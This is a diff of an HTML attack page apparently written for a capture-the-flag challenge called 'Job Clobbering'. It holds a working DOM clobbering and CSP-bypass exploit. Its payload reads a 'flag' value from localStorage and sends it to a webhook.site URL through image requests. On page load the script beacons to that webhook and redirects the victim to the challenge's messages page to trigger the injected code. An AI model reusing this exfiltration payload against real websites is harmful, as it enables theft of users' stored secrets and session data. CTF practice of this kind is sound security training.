@@ -1,56 +1,55 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Two-Step DOM Clobbering Attack</title>
-    <meta charset="UTF-8">
-</head>
-<body>
-    <h1>Two-Step DOM Clobbering Attack for Job Clobbering</h1>
-    <p>This attack uses a two-message approach to bypass CSP restrictions.</p>
-    
-    <script>
-        const CHALLENGE_ORIGIN = 'https://jobclobbering-fe734e8816c7316e.chal.secjhu.club';
-        const WEBHOOK_URL = 'https://webhook.site/ae6ba4ff-a1b4-453d-804e-052d59fabf4a';
-        
-        console.log('[TWO-STEP-ATTACK] Starting two-step DOM Clobbering attack');
-        
-        // Step 1: JavaScript payload (stored as message content, not executed immediately)
-        const javascriptPayload = `*/(new Image).src="${WEBHOOK_URL}?c="+encodeURIComponent(localStorage.getItem("flag")||"no-flag")//`;
-        
-        
-        // Simple redirect attack - messages already posted manually
-        function executeAttack() {
-            console.log('[ATTACK] Starting redirect-only attack');
-            const img1 = new Image();
-            img1.src = WEBHOOK_URL + '?c=ATTACK_STARTING_REDIRECT_ONLY';
-            
-            // Since messages are already posted manually, just redirect to trigger the attack
-            setTimeout(() => {
-                console.log('[ATTACK] Redirecting to messages page to trigger DOM Clobbering...');
-                const img2 = new Image();
-                img2.src = WEBHOOK_URL + '?c=REDIRECTING_TO_TRIGGER_ATTACK';
-                
-                // Go directly to the messages page to trigger DOM Clobbering
-                window.location.replace(CHALLENGE_ORIGIN + '/#messages');
-            }, 2000);
-        }
-        
-        // Execute the attack when the page loads
-        window.addEventListener('load', () => {
-            console.log('[ATTACK] Page loaded, starting attack...');
-            console.log('[ATTACK] Current domain:', window.location.hostname);
-            console.log('[ATTACK] Current URL:', window.location.href);
-            
-            const img = new Image();
-            img.src = WEBHOOK_URL + '?c=ATTACK_PAGE_LOADED&domain=' + encodeURIComponent(window.location.hostname);
-            
-            // Always execute attack - remove domain check
-            setTimeout(() => {
-                const img2 = new Image();
-                img2.src = WEBHOOK_URL + '?c=ABOUT_TO_EXECUTE_ATTACK';
-                executeAttack();
-            }, 1000);
-        });
-    </script>
-</body>
-</html>
+  <!DOCTYPE html>
+  <html>
+  <head>
+      <title>Two-Step DOM Clobbering Attack</title>
+      <meta charset="UTF-8">
+  </head>
+  <body>
+      <h1>Two-Step DOM Clobbering Attack for Job Clobbering</h1>
+      <p>This attack uses a two-message approach to bypass CSP restrictions.</p>
+
+      <script>
+          const CHALLENGE_ORIGIN = 'https://jobclobbering-d61fba936086d20d.chal.secjhu.club';
+          const WEBHOOK_URL = 'https://webhook.site/ae6ba4ff-a1b4-453d-804e-052d59fabf4a';
+
+          console.log('[TWO-STEP-ATTACK] Starting two-step DOM Clobbering attack');
+
+          // Step 1: JavaScript payload (stored as message content, not executed immediately)
+          const javascriptPayload = `*/(new Image).src="${WEBHOOK_URL}?c="+encodeURIComponent(localStorage.getItem("flag")||"no-flag")//`;
+
+          // Simple redirect attack - messages already posted manually
+          function executeAttack() {
+              console.log('[ATTACK] Starting redirect-only attack');
+              const img1 = new Image();
+              img1.src = WEBHOOK_URL + '?c=ATTACK_STARTING_REDIRECT_ONLY';
+
+              // Since messages are already posted manually, just redirect to trigger the attack
+              setTimeout(() => {
+                  console.log('[ATTACK] Redirecting to messages page to trigger DOM Clobbering...');
+                  const img2 = new Image();
+                  img2.src = WEBHOOK_URL + '?c=REDIRECTING_TO_TRIGGER_ATTACK';
+
+                  // Go directly to the messages page to trigger DOM Clobbering
+                  window.location.replace(CHALLENGE_ORIGIN + '/#messages');
+              }, 2000);
+          }
+
+          // Execute the attack when the page loads
+          window.addEventListener('load', () => {
+              console.log('[ATTACK] Page loaded, starting attack...');
+              console.log('[ATTACK] Current domain:', window.location.hostname);
+              console.log('[ATTACK] Current URL:', window.location.href);
+
+              const img = new Image();
+              img.src = WEBHOOK_URL + '?c=ATTACK_PAGE_LOADED&domain=' + encodeURIComponent(window.location.hostname);
+
+              // Always execute attack - remove domain check
+              setTimeout(() => {
+                  const img2 = new Image();
+                  img2.src = WEBHOOK_URL + '?c=ABOUT_TO_EXECUTE_ATTACK';
+                  executeAttack();
+              }, 1000);
+          });
+      </script>
+  </body>
+  </html>
